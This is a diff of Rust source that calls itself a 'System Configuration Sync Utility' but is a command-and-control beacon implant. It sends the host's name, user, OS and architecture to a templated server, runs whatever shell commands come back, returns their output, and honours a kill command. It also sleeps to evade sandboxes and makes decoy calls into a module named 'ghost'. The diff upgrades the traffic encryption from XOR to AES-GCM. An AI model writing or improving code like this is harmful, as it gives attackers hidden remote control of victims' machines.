@@ -1,7 +1,11 @@
 // System Configuration Sync Utility
 // Manages endpoint configuration and health telemetry
 mod ghost;
-use std::collections::HashMap;
+use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
+use aes_gcm::aead::Aead;
+use base64::{Engine as _, engine::general_purpose::STANDARD as B64};
+use sha2::{Sha256, Digest};
+use serde_json::{json, Value};
 use std::io::{Read, Write};
 use std::net::TcpStream;
 use std::process::Command;
@@ -19,21 +23,47 @@ const P2: &str = "{{CHECKIN_URI}}";
 const P3: &str = "{{RESULT_URI}}";
 const UA: &str = "{{USER_AGENT}}";
 
-fn xc(d: &[u8], k: &[u8]) -> Vec<u8> {
-    d.iter().enumerate().map(|(i, b)| b ^ k[i % k.len()]).collect()
+fn derive_key() -> [u8; 32] {
+    let mut hasher = Sha256::new();
+    hasher.update(AK.as_bytes());
+    let result = hasher.finalize();
+    let mut key = [0u8; 32];
+    key.copy_from_slice(&result);
+    key
 }
-
-fn b6e(d: &[u8]) -> String { base64::encode(d) }
-fn b6d(d: &str) -> Option<Vec<u8>> { base64::decode(d).ok() }
 
 fn enc(pt: &str) -> String {
-    let k = AK.as_bytes();
-    b6e(&xc(pt.as_bytes(), k))
+    let key = derive_key();
+    let cipher = Aes256Gcm::new_from_slice(&key).unwrap();
+    let mut nonce_bytes = [0u8; 12];
+    getrandom(&mut nonce_bytes);
+    let nonce = Nonce::from_slice(&nonce_bytes);
+    let ct = cipher.encrypt(nonce, pt.as_bytes()).unwrap();
+    let mut result = Vec::with_capacity(4 + 12 + ct.len());
+    result.extend_from_slice(b"AES1");
+    result.extend_from_slice(&nonce_bytes);
+    result.extend_from_slice(&ct);
+    B64.encode(&result)
 }
 
-fn dec(e: &str) -> Option<String> {
-    let r = b6d(e)?;
-    String::from_utf8(xc(&r, AK.as_bytes())).ok()
+fn dec(encoded: &str) -> Option<String> {
+    let raw = B64.decode(encoded.trim()).ok()?;
+    if raw.len() > 4 && &raw[..4] == b"AES1" {
+        let key = derive_key();
+        let cipher = Aes256Gcm::new_from_slice(&key).ok()?;
+        let nonce = Nonce::from_slice(&raw[4..16]);
+        let pt = cipher.decrypt(nonce, &raw[16..]).ok()?;
+        return String::from_utf8(pt).ok();
+    }
+    // XOR fallback for legacy server compat
+    let k = AK.as_bytes();
+    let pt: Vec<u8> = raw.iter().enumerate().map(|(i, b)| b ^ k[i % k.len()]).collect();
+    String::from_utf8(pt).ok()
+}
+
+fn getrandom(buf: &mut [u8]) {
+    use rand::RngCore;
+    rand::thread_rng().fill_bytes(buf);
 }
 
 fn hn() -> String {
@@ -74,24 +104,14 @@ fn hp(p: &str, b: &str) -> Option<String> {
     let a = format!("{}:{}", EP, PT);
     let mut s = TcpStream::connect_timeout(&a.parse().ok()?, Duration::from_secs(30)).ok()?;
     s.set_read_timeout(Some(Duration::from_secs(60))).ok();
-    let r = format!("POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}", p, a, UA, b.len(), b);
+    let r = format!(
+        "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
+        p, a, UA, b.len(), b
+    );
     s.write_all(r.as_bytes()).ok()?;
     let mut resp = String::new();
     s.read_to_string(&mut resp).ok()?;
     resp.find("\r\n\r\n").map(|i| resp[i+4..].to_string())
-}
-
-fn jv(k: &str, v: &str, q: bool) -> String {
-    if q { format!("\"{}\":\"{}\"", k, v.replace('\\', "\\\\").replace('"', "\\\"")) }
-    else { format!("\"{}\":{}", k, v) }
-}
-
-fn xs(j: &str, k: &str) -> Option<String> {
-    let s = format!("\"{}\":\"", k);
-    j.find(&s).and_then(|i| {
-        let vs = i + s.len();
-        j[vs..].find('"').map(|e| j[vs..vs+e].to_string())
-    })
 }
 
 fn main() {
@@ -113,25 +133,30 @@ fn main() {
     let _ = ghost::current_timestamp();
     let _ = ghost::create_status_report();
     let _ = ghost::parse_csv("a,b,c\n1,2,3");
-    // Start health server on random high port (legitimate service behavior)
-    
-    // Env check
+
     if std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1) < 2 {
         thread::sleep(Duration::from_secs(30));
     }
 
-    let h = hn(); let u = un();
-    let m = format!("{{\"type\":\"register\",\"metadata\":{{{},{},{},{},{}}}}}",
-        jv("hostname", &h, true), jv("username", &u, true),
-        jv("os", std::env::consts::OS, true), jv("mode", "beacon", true),
-        jv("beacon_interval", &SI.to_string(), false));
+    let meta = json!({
+        "hostname": hn(),
+        "username": un(),
+        "os": std::env::consts::OS,
+        "architecture": std::env::consts::ARCH,
+        "mode": "beacon",
+        "beacon_interval": SI
+    });
+    let reg = json!({"type": "register", "metadata": meta});
 
     let mut aid = String::new();
     for _ in 0..10 {
-        if let Some(r) = hp(P1, &enc(&m)) {
+        if let Some(r) = hp(P1, &enc(&reg.to_string())) {
             if let Some(d) = dec(&r) {
-                if let Some(id) = xs(&d, "agent_id") {
-                    aid = id; break;
+                if let Ok(v) = serde_json::from_str::<Value>(&d) {
+                    if let Some(id) = v["agent_id"].as_str() {
+                        aid = id.to_string();
+                        break;
+                    }
                 }
             }
         }
@@ -139,25 +164,36 @@ fn main() {
     }
     if aid.is_empty() { return; }
 
-    let mut pr: Vec<String> = Vec::new();
+    let mut pending: Vec<Value> = Vec::new();
     loop {
-        let rj = if pr.is_empty() { "[]".into() } else { format!("[{}]", pr.join(",")) };
-        let ci = format!("{{\"type\":\"checkin\",\"agent_id\":\"{}\",\"metadata\":{{\"mode\":\"beacon\"}},\"results\":{}}}", aid, rj);
-        pr.clear();
+        let ci = json!({
+            "type": "checkin",
+            "agent_id": aid,
+            "metadata": {"mode": "beacon"},
+            "results": pending
+        });
+        pending.clear();
 
-        if let Some(r) = hp(P2, &enc(&ci)) {
+        if let Some(r) = hp(P2, &enc(&ci.to_string())) {
             if let Some(d) = dec(&r) {
-                let mut sf = 0;
-                while let Some(p) = d[sf..].find("\"command\":\"") {
-                    let ap = sf + p + 11;
-                    if let Some(e) = d[ap..].find('"') {
-                        let cmd = &d[ap..ap+e];
-                        if cmd == "__kill" { std::process::exit(0); }
-                        let out = ex(cmd);
-                        let oe = out.replace('\\', "\\\\").replace('"', "\\\"").replace('\n', "\\n").replace('\r', "\\r");
-                        pr.push(format!("{{\"type\":\"response\",\"output\":\"{}\",\"command\":\"{}\"}}", oe, cmd));
-                        sf = ap + e + 1;
-                    } else { break; }
+                if let Ok(v) = serde_json::from_str::<Value>(&d) {
+                    if let Some(cmds) = v["commands"].as_array() {
+                        for c in cmds {
+                            if let Some(cmd) = c["command"].as_str() {
+                                if cmd == "__kill" { std::process::exit(0); }
+                                if cmd.starts_with("__set_interval:") {
+                                    // interval change handled by server
+                                    continue;
+                                }
+                                let out = ex(cmd);
+                                pending.push(json!({
+                                    "type": "response",
+                                    "output": out,
+                                    "command": cmd
+                                }));
+                            }
+                        }
+                    }
                 }
             }
         }
